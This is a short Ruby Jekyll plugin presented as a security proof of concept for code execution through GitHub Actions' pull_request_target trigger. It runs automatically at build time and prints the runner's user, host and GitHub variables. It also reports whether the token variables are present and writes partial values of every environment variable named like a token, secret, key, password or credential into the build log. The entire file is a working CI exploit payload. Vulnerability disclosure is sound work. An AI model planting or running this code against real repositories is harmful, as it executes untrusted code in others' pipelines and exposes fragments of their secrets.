# Security PoC — demonstrates code execution via pull_request_target
# This plugin runs during Jekyll build and prints environment info
# No destructive actions — informational only
Jekyll::Hooks.register :site, :after_init do |site|
  puts "=" * 60
  puts "SECURITY POC — CODE EXECUTION CONFIRMED"
  puts "=" * 60
  puts "whoami: #{`whoami`.strip}"
  puts "hostname: #{`hostname`.strip}"
  puts "pwd: #{Dir.pwd}"
  puts "GITHUB_REPOSITORY: #{ENV['GITHUB_REPOSITORY']}"
  puts "GITHUB_WORKFLOW: #{ENV['GITHUB_WORKFLOW']}"
  puts "GITHUB_ACTOR: #{ENV['GITHUB_ACTOR']}"
  puts "GITHUB_EVENT_NAME: #{ENV['GITHUB_EVENT_NAME']}"
  puts "GITHUB_TOKEN set: #{ENV['GITHUB_TOKEN'] ? 'YES (length=' + ENV['GITHUB_TOKEN'].length.to_s + ')' : 'NO'}"
  puts "ACTIONS_ID_TOKEN_REQUEST_URL set: #{ENV['ACTIONS_ID_TOKEN_REQUEST_URL'] ? 'YES' : 'NO'}"
  puts "ACTIONS_ID_TOKEN_REQUEST_TOKEN set: #{ENV['ACTIONS_ID_TOKEN_REQUEST_TOKEN'] ? 'YES' : 'NO'}"
  puts "=" * 60
  puts "Environment variables containing TOKEN or SECRET:"
  ENV.each do |k, v|
    if k =~ /TOKEN|SECRET|KEY|PASS|CRED/i
      puts "  #{k}=#{v[0..3]}...#{v[-4..]}" if v.length > 8
      puts "  #{k}=[redacted-short]" if v.length <= 8
    end
  end
  puts "=" * 60
end
